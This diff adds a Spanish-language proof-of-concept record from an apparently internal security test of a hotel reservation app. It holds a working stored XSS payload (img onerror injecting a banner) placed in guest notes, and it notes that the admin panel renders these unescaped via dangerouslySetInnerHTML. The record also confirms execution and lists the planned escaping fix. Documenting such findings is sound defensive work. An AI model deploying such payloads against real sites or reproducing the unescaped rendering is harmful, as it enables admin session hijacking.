@@ -1,0 +1,24 @@
+############ OP-POC-3 — XSS stored via guest_notes (portal -> panel admin) ############
+# Entorno: Supabase LOCAL (supabase start), rama security/operations/fase2-pocs, 2026-10-20.
+# Navegador integrado, sesion como sec.owner@hotel.local (OWNER).
+
+## Payload almacenado en reservations.guest_notes (reserva RES-010):
+<img src=x onerror="document.title='XSS-OP-POC-3';var d=document.createElement('div');d.id='pwned-op-poc-3';d.textContent='XSS-OP-POC-3 ejecutado en la sesion del admin';d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;background:#c00;color:#fff;font:bold 24px sans-serif;padding:18px;text-align:center';document.body.appendChild(d)">
+
+## Nota de reproduccion:
+# El payload representa la entrada de un huesped en "Solicitudes especiales" (checkout publico, anonimo).
+# Se inserto la fila directamente en la BD local porque el flujo checkout->persistReservation NO persiste
+# (bug aparte: inserta room_id = id de mockRooms "mv-1" string en reservations.room_id uuid/FK). El sink de
+# OP-POC-3 es la SALIDA: ReservationGuestCard renderiza guest_notes con dangerouslySetInnerHTML (sin escapar).
+
+## Confirmacion de EJECUCION al abrir /admin/reservations/<id> (ReservationGuestCard):
+#   xss_executed      : true   (div #pwned-op-poc-3 inyectado y presente en el DOM)
+#   banner_text       : "XSS-OP-POC-3 ejecutado en la sesion del admin"
+#   hasInjectedImg    : true   (el <img src=x> se renderizo como HTML, no como texto -> guest_notes NO escapado)
+#   document.title    : cambiado a "XSS-OP-POC-3" por el onerror (visible en el titulo de la pestana)
+#
+# Captura: A2.2-xss-executed-panel.png  (banner rojo + detalle RES-010 + sesion OWNER + <img> roto en
+# "SOLICITUDES ESPECIALES"). El JS corre con los privilegios del admin autenticado.
+#
+# Impacto: un atacante anonimo (nota de huesped) ejecuta JS arbitrario en la sesion de un admin ->
+# robo de sesion / acciones privilegiadas. Fix Fase 3 (A3.2): escape por salida ({guest.notes}).
